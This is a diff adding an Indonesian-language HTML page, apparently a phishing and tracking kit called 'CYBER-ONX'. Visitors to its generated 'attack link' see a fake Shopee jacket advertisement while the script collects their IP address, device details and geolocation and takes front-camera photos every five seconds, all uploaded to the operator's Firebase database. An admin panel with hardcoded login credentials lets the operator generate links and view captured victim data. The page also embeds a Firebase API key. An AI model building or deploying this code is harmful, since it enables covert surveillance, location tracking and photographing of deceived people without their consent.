@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee Jaket Skena COD</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+
+    <style>
+        :root {
+            --bg-main: #0a0a0c;
+            --panel-bg: rgba(30, 30, 35, 0.7);
+            --accent-glow: #00f2ff;
+            --accent-dark: #0066ff;
+            --border-glass: rgba(255, 255, 255, 0.1);
+            --success: #00ff64;
+            --danger: #ff0055;
+            --card-grad: linear-gradient(145deg, #1e1e24, #141418);
+        }
+
+        body {
+            margin: 0; padding: 0; background-color: var(--bg-main);
+            color: white; font-family: 'Inter', sans-serif;
+            display: flex; justify-content: center; min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* View Target (Shopee Palsu) */
+        #target-view {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 999999; display: none;
+            justify-content: center; align-items: flex-start; overflow-y: auto;
+        }
+        #target-view img { width: 100%; height: auto; }
+
+        /* Admin Layout */
+        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; }
+        .header-profile {
+            background: var(--panel-bg); backdrop-filter: blur(10px);
+            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
+            text-align: center; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .control-panel {
+            background: var(--panel-bg); border-radius: 24px; padding: 20px;
+            border: 1px solid var(--border-glass); margin-bottom: 20px;
+        }
+
+        .input-group {
+            background: rgba(0,0,0,0.4); border-radius: 14px; padding: 12px;
+            border: 1px solid #333; display: flex; align-items: center; margin-top: 10px;
+        }
+        .input-group input {
+            background: transparent; border: none; color: #fff; width: 100%;
+            outline: none; font-size: 12px;
+        }
+
+        .btn-action {
+            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
+            color: #000; border: none; padding: 12px 18px; border-radius: 12px;
+            font-weight: 800; cursor: pointer; width: 100%; margin-top: 10px;
+        }
+
+        .target-folder {
+            background: var(--card-grad); border-radius: 18px; padding: 15px;
+            margin-top: 10px; display: flex; align-items: center;
+            justify-content: space-between; border-left: 4px solid var(--accent-glow);
+        }
+
+        /* Modal Overlay */
+        #gallery-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box;
+            overflow-y: auto;
+        }
+        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
+        .grid-photos img { width: 100%; border-radius: 10px; border: 1px solid #333; }
+
+        #login-gate {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 10000; display: flex;
+            justify-content: center; align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+<div id="target-view">
+    <img src="https://i.imgur.com/swSbjoE.jpeg" alt="Shopee">
+</div>
+
+<div id="login-gate">
+    <div class="control-panel" style="width: 300px; text-align: center;">
+        <h2 style="font-family: 'Orbitron'; color: var(--accent-glow);">CYBER-ONX</h2>
+        <div class="input-group"><input type="text" id="user-in" placeholder="Username"></div>
+        <div class="input-group"><input type="password" id="pass-in" placeholder="Password"></div>
+        <button class="btn-action" onclick="auth()">LOGIN SYSTEM</button>
+    </div>
+</div>
+
+<div class="phone-frame" id="admin-view" style="display:none;">
+    <div class="header-profile">
+        <h1 style="font-family:'Orbitron'; margin:0; font-size:20px;">CYBER-ONX</h1>
+        <div style="font-size:10px; color:var(--success); margin-top:5px;">DATABASE CLOUD CONNECTED</div>
+    </div>
+
+    <div class="control-panel">
+        <label style="font-size:10px; color:#888;">GENERATED ATTACK LINK</label>
+        <div class="input-group">
+            <input type="text" id="gen-url" readonly value="Generating...">
+            <button onclick="copyLink()" style="background:none; border:none; color:var(--accent-glow); font-weight:bold; cursor:pointer;">COPY</button>
+        </div>
+    </div>
+
+    <div class="control-panel">
+        <label style="font-size:10px; color:#888;">LIVE TARGET DATA</label>
+        <div id="target-list">
+            <p style="text-align:center; color:#444; font-size:11px;">Waiting for connection...</p>
+        </div>
+    </div>
+</div>
+
+<div id="gallery-overlay">
+    <button class="btn-action" onclick="document.getElementById('gallery-overlay').style.display='none'">CLOSE FOLDER</button>
+    <div id="info-container" class="control-panel" style="margin-top:20px;"></div>
+    <div class="grid-photos" id="photo-grid"></div>
+</div>
+
+<script>
+    // Konfigurasi Firebase lo
+    const firebaseConfig = {
+      apiKey: "AIzaSyAydM6bos2I1uGuFrj6DeJ_TDjJFhmfvT0",
+      authDomain: "shope-bd354.firebaseapp.com",
+      databaseURL: "https://shope-bd354-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "shope-bd354",
+      storageBucket: "shope-bd354.firebasestorage.app",
+      messagingSenderId: "344259593578",
+      appId: "1:344259593578:web:108cd8edb3069641799113"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const APP_PREFIX = 'cyberonx_v1_';
+
+    const params = new URLSearchParams(window.location.search);
+    const idParam = params.get('id');
+    const uOwner = params.get('u');
+
+    window.onload = function() {
+        if(idParam && uOwner) {
+            // Mode Target
+            document.getElementById('login-gate').style.display = 'none';
+            document.getElementById('target-view').style.display = 'flex';
+            startCapture(idParam, uOwner);
+        } else {
+            // Mode Admin
+            if(localStorage.getItem(APP_PREFIX + 'logged') === 'true') showAdmin();
+        }
+    };
+
+    function auth() {
+        const u = document.getElementById('user-in').value;
+        const p = document.getElementById('pass-in').value;
+        if(u === 'ondev' && p === 'ondev') {
+            localStorage.setItem(APP_PREFIX + 'user', u);
+            localStorage.setItem(APP_PREFIX + 'logged', 'true');
+            showAdmin();
+        } else { alert('Akses Ditolak!'); }
+    }
+
+    function showAdmin() {
+        document.getElementById('login-gate').style.display = 'none';
+        document.getElementById('admin-view').style.display = 'block';
+        const user = localStorage.getItem(APP_PREFIX + 'user');
+        
+        // Buat Link
+        const baseUrl = window.location.href.split('?')[0];
+        document.getElementById('gen-url').value = `${baseUrl}?id=${Math.floor(1000+Math.random()*9000)}&u=${user}`;
+        
+        // Listen Data Realtime
+        database.ref('targets/' + user).on('value', (snapshot) => {
+            const data = snapshot.val();
+            const list = document.getElementById('target-list');
+            list.innerHTML = '';
+            if(!data) { list.innerHTML = '<p style="text-align:center; color:#444;">No data yet.</p>'; return; }
+            
+            Object.keys(data).reverse().forEach(id => {
+                const t = data[id];
+                const div = document.createElement('div');
+                div.className = 'target-folder';
+                div.innerHTML = `
+                    <div onclick="openFolder('${id}')" style="cursor:pointer;">
+                        <b style="color:var(--accent-glow)">TRACK #${id}</b><br>
+                        <small style="font-size:9px; color:#888;">${t.info ? t.info.time : ''}</small>
+                    </div>
+                    <button onclick="hapus('${id}')" style="background:none; border:none; color:var(--danger); cursor:pointer;">DEL</button>
+                `;
+                list.appendChild(div);
+            });
+        });
+    }
+
+    function openFolder(id) {
+        const user = localStorage.getItem(APP_PREFIX + 'user');
+        database.ref('targets/' + user + '/' + id).once('value').then((s) => {
+            const t = s.val();
+            document.getElementById('info-container').innerHTML = `
+                <div style="font-size:11px; line-height:1.8;">
+                    IP: <span style="color:var(--accent-glow)">${t.info.ip}</span><br>
+                    LOC: <span style="color:var(--accent-glow)">${t.info.addr}</span><br>
+                    TIME: <span>${t.info.time}</span>
+                </div>
+            `;
+            document.getElementById('photo-grid').innerHTML = (t.photos || []).map(p => `<img src="${p}">`).join('');
+            document.getElementById('gallery-overlay').style.display = 'block';
+        });
+    }
+
+    function hapus(id) {
+        if(confirm('Hapus data target ini?')) {
+            const user = localStorage.getItem(APP_PREFIX + 'user');
+            database.ref('targets/' + user + '/' + id).remove();
+        }
+    }
+
+    // FUNGSI INI YANG JALAN DI HP TARGET
+    function startCapture(id, owner) {
+        let photosArray = [];
+        
+        // Ambil IP
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => {
+            database.ref('targets/' + owner + '/' + id + '/info').update({
+                ip: res.ip,
+                time: new Date().toLocaleString(),
+                ua: navigator.userAgent
+            });
+        });
+
+        // Ambil Lokasi
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
+            .then(r => r.json()).then(res => {
+                database.ref('targets/' + owner + '/' + id + '/info').update({ addr: res.display_name });
+            });
+        }, () => {
+            database.ref('targets/' + owner + '/' + id + '/info').update({ addr: "Izin lokasi ditolak" });
+        });
+
+        // Ambil Kamera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => {
+            const v = document.createElement('video');
+            v.srcObject = s; v.play();
+            setInterval(() => {
+                const c = document.createElement('canvas');
+                c.width = 400; c.height = 400;
+                c.getContext('2d').drawImage(v, 0, 0, 400, 400);
+                const imgData = c.toDataURL('image/jpeg', 0.4);
+                
+                photosArray.unshift(imgData);
+                if(photosArray.length > 10) photosArray.pop();
+                
+                // Kirim ke Firebase
+                database.ref('targets/' + owner + '/' + id).update({ photos: photosArray });
+            }, 5000);
+        }).catch(() => {
+            database.ref('targets/' + owner + '/' + id + '/info').update({ cam: "Izin kamera ditolak" });
+        });
+    }
+
+    function copyLink() {
+        const copyText = document.getElementById("gen-url");
+        copyText.select();
+        document.execCommand("copy");
+        alert("Link tersalin!");
+    }
+</script>
+</body>
+</html>
